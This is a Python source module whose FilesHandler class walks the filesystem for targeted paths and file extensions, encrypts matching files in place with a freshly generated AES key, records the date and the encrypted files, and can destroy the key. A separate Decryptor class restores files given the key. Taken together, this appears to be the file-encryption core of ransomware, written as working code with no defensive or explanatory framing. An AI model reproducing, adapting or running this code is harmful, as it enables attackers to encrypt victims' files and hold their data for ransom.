import os, scandir, json
from .encryptions import AES

DEFAULT_KEY_SIZE = 16

class FilesHandler:
    """
    Handles operations on files
    """
    def __init__(self, files_to_target):
        self.__cipher_key = os.urandom(DEFAULT_KEY_SIZE)
        self.__aes = AES(self.__cipher_key)
        # stores located target files
        self.__files_to_target = files_to_target
        self.__files = []
        # stores encrypted files
        self.__encrypted_files = []
        self.__encryption_date = None
        # event callback. called when file encryption occurs
        self.encryption_event = None

    def __traverse_files(self, encrypt=False):
        self.__traverse_full_path(encrypt)
        for root in self.__files_to_target["roots"]:
            self.__traverse_files_from_root(root)

    def __traverse_full_path(self, encrypt=False):
        """
        Searches for files in local filesystem by their full path and encrypts them if defined.
        Also appends the files to the respective lists and actions.
        :param encrypt: bool;  encrypts located files while traversing if true
        :return: None
        """
        paths = self.__files_to_target['fullPath']
        for _file in paths:
            if os.path.isfile(_file):
                if encrypt:
                    self.encrypt_file(_file)
                self.__files.append(_file)

    def __traverse_files_from_root(self, roots_item, encrypt=False):
        """
        Searches for files in local filesystem from a root folder and encrypts them if defined
        Also appends the files to the respective lists and actions.
        :param roots_item: str; root folder
        :param encrypt: bool;  encrypts located files while traversing if true
        :return: None
        """
        for path in roots_item["paths"]:
            for (root, dirs, files) in scandir.walk(path, topdown=True):
                for filename in files:
                    if filename in roots_item["files"]:
                        _file = os.path.join(path, filename)
                        self.__files.append(_file)
                        if encrypt:
                            self.encrypt_file(_file)
                    else:
                        name, file_extension = os.path.splitext(filename)
                        if file_extension in roots_item["extensions"]:
                            _file = os.path.join(root, filename)
                            self.__files.append(_file)
                            if encrypt:
                                self.encrypt_file(_file)

    def get_files(self):
        """
        returns files list
        :return: list
        """
        return self.__files

    def get_encrypted_files(self):
        """
        Returns encrypted files list
        :return: list
        """
        return self.__encrypted_files

    def subscribe_to_encryption_event(self, callback):
        """
        Subscribes a callback method to encryption's event
        :param callback: function
        :return: None
        """
        self.encryption_event = callback

    def set_cipher_key(self, cipher_key):
        self.__cipher_key = cipher_key

    def get_cipher_key(self):
        return self.__cipher_key

    def set_encrypted_files(self, files):
        self.__encrypted_files = files

    def get_files_as_json(self):
        files = {"files": self.__files}
        return json.dumps(files)

    def set_date(self, date):
        self.__encryption_date = date

    def get_date(self):
        return self.__encryption_date

    def encrypt_file(self, _file):
        """
        Encrypts a file and saves it in the list
        :param _file: File
        :return: None
        """
        # avoids multiple encryption on same file
        if _file not in self.__encrypted_files:
            self.__aes.encrypt_file(_file)
            self.__encrypted_files.append(_file)
            if self.encryption_event:
                self.encryption_event(_file)

    def encrypt(self):
        """
        Locate target files and encrypts them all
        :return: None
        """
        self.__traverse_files(True)
    '''def encrypt(self):
        for _file in self.__files:
            if os.path.exists(_file):
                self.__aes.encrypt_file(_file)
                self.__encrypted_files.append(_file)'''

    def decrypt(self, key=None):
        """
        Decrypts all encrypted files
        :param key: Bytes; uses class's saved cipher key if not provided
        :return: None
        """
        key = self.__cipher_key if not key else key
        self.__aes = AES(key)
        for _file in self.__encrypted_files:
            self.__aes.decrypt_file(_file)

    def destroy_key(self):
        """
        Eliminates cipher key
        :return: None
        """
        self.__cipher_key = None
        self.__aes = None


class Decryptor:
    def __init__(self, key):
        """
        :param key: bytes; cipher key
        """
        self.__key = key
        self.__aes =  AES(key)

    def decrypt_file(self, _file):
        """
        Decrypts given file
        :param _file: File
        :return: None
        """
        self.__aes.decrypt_file(_file)
